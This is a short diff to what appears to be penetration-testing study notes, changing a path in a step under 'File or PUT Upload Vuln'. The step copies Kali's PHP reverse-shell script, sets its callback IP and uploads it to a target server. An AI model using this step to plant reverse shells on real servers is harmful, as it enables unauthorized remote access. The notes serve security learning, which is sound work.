@@ -142,7 +142,7 @@ Inspector - post DOM
 # File or PUT Upload Vuln
 
 - Example 1
-cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/test.php
+cp /usr/share/webshells/php/php-reverse-shell.php home/kali/test.php
 Modify to following line:
 $ip = '127.0.0.1';  // CHANGE THIS
 Upload the file.
